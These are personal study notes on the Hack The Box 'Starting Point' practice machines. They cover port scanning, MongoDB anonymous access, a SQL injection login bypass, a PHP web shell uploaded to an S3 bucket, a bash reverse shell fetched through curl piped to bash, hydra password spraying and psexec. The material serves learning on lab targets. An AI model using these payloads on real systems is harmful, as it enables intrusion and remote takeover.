---
draft: "true"
language: english
status: incomplete
tags: [none]
title: Starting Point
---

# Starting Point

## TIER 0

### Meow

Every server uses **ports** in order to serve data to other clients. The first steps in the Enumeration phase involve scanning these open ports to see the purpose of the target on the network and what potential vulnerabilities might appear from the services running on it. There is a tool called `nmap`.

After finding the open ports on the target, you can manually access each of them using different tools to find out if you have access to their contents or not. Different services will use different tools or scripts to be accessed.

CTF machines - Only have one file named `flag.txt`.
Normal machines - Have two files named `user.txt` (regular user) and `root.txt` (privilege user).

### Fawn

A port running an active service is a reserved space for the IP address of the target to receive requests and send results from. If you only had IP addresses or hostnames, then the hosts could only do 1 task at a time.

This means that if you wanted to browse the web and play music from an application on your computer simultaneously, you could not, because the IP address would be used for handling either the first or the latter, but not both at the same time. By having ports, you can have one IP address handling multiple services, as it adds another layer of distinction

Note that when using the `ping` command this might not always work in a large-scale corporate environment, as firewalls usually have rules to prevent pinging between hosts, even in the same subnet (LAN), to avoid insider threats and discover other hosts and services.

### Explosion

It is always a good idea to research the ports found in order to understand the big picture. SpeedGuide is a good resource for those just starting out with their networking basics and interested in understanding more common ports at a glance.

```
https://www.speedguide.net/port.php?port=<𝑷𝑶𝑹𝑻_𝑵𝑼𝑴𝑩𝑬𝑹>
```

### Mongod

Databases are a collection of organized information that can be easily accessed, managed and updated.

There are different types of databases and one among them is MongoDB, which is a document-oriented NoSQL database. It is crucial to be aware of how the data is stored in different types of databases and how we can connect to these remote database servers and retrieve the desired data. In a document-oriented NoSQL database, the data is organized into a hierarchy of the following levels:

- databases
- collections
- documents

Databases make up the top level of data organization in a MongoDB instance. Databases are organized into collections which contain documents. Documents contain literal data such as strings, numbers, dates, etc. in a JSON-like format.

It often happens that the database server is misconfigured to permit anonymous login which can be exploited by an attacker to get access to sensitive information stored on the database.

`Mongod` is a Linux box that features a MongoDB server running on it which allows anonymous login without a username or password. We can remotely connect to this MongoDB server using the `mongo` command line utility.

What is MongoDB?

MongoDB is a document-oriented NoSQL database. Instead of using tables and rows like in traditional relational databases, MongoDB makes use of collections and documents. Each database contains collections which in turn further contain documents. Each document consists of key-value pairs which are the basic unit of data in a MongoDB database. A single collection can contain multiple documents and they are schema-less meaning that the size and content of each document can be different from each another.

Connect to the MongoDB server running on the remote host as an anonymous user:

```bash
./mongo mongodb://𝑡𝑎𝑟𝑔𝑒𝑡_𝑖𝑝:27017
```

List the databases:

```bash
show dbs;
```

Select a database:

```bash
use <𝑫𝑨𝑻𝑨𝑩𝑨𝑺𝑬_𝑵𝑨𝑴𝑬>;
```

List the collections stored in the selected database:

```bash
show collections;
```

See the content of a collection with the output in a beautified format:

```bash
db.<𝑪𝑶𝑳𝑳𝑬𝑪𝑻𝑰𝑶𝑵>.find().pretty();
```

## TIER 1

### Appointment

Using a primary SQL injection in PHP you can bypass the login form like this: `admin'#` as username and password whatever you want.

In the code will be something like this:

```sql
SELECT * FROM users WHERE username='admin'#' AND password='abc123.'
```

### Responder

Name-Based Virtual hosting is a method for hosting multiple domain names (with separate handling of each name) on a single server. This allows one server to share its resources, such as memory and processor cycles, without requiring all the services to be used by the same hostname.
The web server checks the domain name provided in the Host header field of the HTTP request and sends a response according to that.

The `/etc/hosts` file is used to resolve a hostname into an IP address.

```bash
echo "𝑡𝑎𝑟𝑔𝑒𝑡_𝑖𝑝 ℎ𝑜𝑠𝑡𝑛𝑎𝑚𝑒" | sudo tee -a /etc/hosts
```

Adding this entry in the `/etc/hosts` file will enable the browser to resolve the hostname to the corresponding IP address & thus make the browser include the HTTP header Host: `ℎ𝑜𝑠𝑡𝑛𝑎𝑚𝑒` in every HTTP request that the browser sends to this IP address, which will make the server respond with the webpage for the `ℎ𝑜𝑠𝑡𝑛𝑎𝑚𝑒` specified.

John the reaper:

```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

### Three

The `/etc/hosts` file is used to resolve a hostname into an IP address. By default, the `/etc/hosts `file is queried before the DNS server for hostname resolution thus we will need to add an entry in the `/etc/hosts` file for this domain to enable the browser to resolve the address for the domain name.

```bash
echo "ip_address domain" | sudo tee -a /etc/hosts
```

What is a subdomain?

A subdomain name is a piece of additional information added to the beginning of a website’s domain name. It allows websites to separate and organize content for a specific function — such as a blog or an online store — from the rest of your website.

For example, if we visit hackthebox.com we can access the main website. Or, we can visit
ctf.hackthebox.com to access the section of the website that is used for CTFs. In this case, ctf is the
subdomain, hackthebox is the primary domain and com is the [top-level domain](https://www.cloudflare.com/en-in/learning/dns/top-level-domain/) (TLD). Although the URL changes slightly, you’re still on HTB's website, under HTB's domain.

Often, different subdomains will have different IP addresses, so when our system goes to look up the subdomain, it gets the address of the server that handles that application. It is also possible to have one server handle multiple subdomains. This is accomplished via "host-based routing", or "virtual host routing", where the server uses the Host header in the HTTP request to determine which application is meant to handle the request.

If using Gobuster version 3.2.0 and above we also have to add the --append-domain flag to our
command so that the enumeration takes into account the known vHost ( thetoppers.htb ) and appends it to the words found in the wordlist ( word.thetoppers.htb ).

To interact with S3 bucket you have the utility `awscli`.

Configure the command.

```bash
aws configure
```

List all of the S3 buckets hosted by the server by using the `ls` command

```
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

You can also use the ls command to list objects and common prefixes under the specified bucket.

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

`awscli` has got another feature that allows us to copy files to a remote bucket.

Try uploading a PHP shell file to the S3 bucket (get cmd inside):

```
<?php system($_GET["command"]); ?>
```

Create a PHP file to upload (get cmd inside).

```
echo '<?php system($_GET["command"]); ?>' > shell.php
```

Upload this PHP shell to the thetoppers.htb S3 bucket using the following command.

```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

The response from the server contains the output of the OS command id , which verified that we have code execution on the box. Thus, let us now try to obtain a reverse shell.
Through a reverse shell, we will trigger the remote host to connect back to our local machine's IP address on the specified listening port. We can obtain the tun0 IP address of our local machine using the following command.

Let's get a reverse shell by creating a new file shell.sh containing the following bash reverse shell payload which will connect back to our local machine on port 1337 .

```bash
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
```

Start a ncat listener on our local port 1337 using the following command.

```bash
nc -nvlp 1337
```

Start a web server on our local machine on port 8000 and host this bash file. It is crucial to note here that this command for hosting the web server must be run from the directory which contains the reverse shell file. So, we must first traverse to the appropriate directory and then run the following command.

```bash
python3 -m http.server 8000
```

Use the curl utility to fetch the bash reverse shell file from our local host and then pipe it to bash
in order to execute it. Thus, let us visit the following URL containing the payload in the browser.

```bash
http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash
```

### Bike

Tip: An error is not always a bad thing. On the contrary for a Penetration Tester, it can provide valuable information. In this case we can see that the server is running from the /root/Backend directory and also that the Handlebars Template Engine is being used.

### Funnel

List listening ports:

```bash
ss -tln
```

- `-l` - Display only listening sockets.
- `-t` - Display TCP sockets.
- `-n` - Do not try to resolve service names.

First time local port forwarding in ssh. https://linuxize.com/post/how-to-setup-ssh-tunneling/

> Local port forwarding is mostly used to connect to a remote service on an internal network such as a database or VNC server.

New term: _password spraying_ - the software to do that is named `hydra`.

From a list of usernames and only one password try to connect to ssh:

```bash
hydra -L file -p 'password' target_IP ssh
```

To manage the PostgreSQL you have the command `psql`.

```bash
ssh -L my_local_port:localhost:target_ssh_port username@remote.example.com
```

```bash
ssh -L my_local_port:localhost:target_postgresql_port username@target_IP
```

Connect from my machine to the target:

```bash
psql -U username -h localhost -p local_port
```

List databases within postgresql:

```bash
\l
```

Connect to a database:

```bash
\c database_name
```

List tables:

```bash
\dt
```

### Pennyworth

jenkins repository - https://github.com/gquere/pwn_jenkins

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

Listen with the netcat to get a reverse shell:

```bash
nc -lvnp port
```

- `l` - Listening mode.
- `v` - Verbose mode. Displays status messages in more detail.
- `n` - Numeric-only IP address. No hostname resolution. DNS is not being used.
- `p` - Port. Use to specify a particular port for listening.

### Tactics

https://github.com/fortra/impacket

PsExec is a portable tool from Microsoft that lets you run processes remotely using any user's
credentials. It’s a bit like a remote access program but instead of controlling the computer with a mouse, commands are sent via Command Prompt, without having to manually install client software.

From impacket, I use psexec.py that is similar to the microsoft tool.

```bash
python3 psexec.py username:password@hostIP
```

But because the Administrator account doesn't have password, you can ommt it

```bash
psexec.py administrator@10.10.10.131
```

Using the `psexec` utility is often preferred in simulated testing environments, but it can be easily
detected by the Windows Defender in real-world assessments.

## References

- https://app.hackthebox.com/starting-point
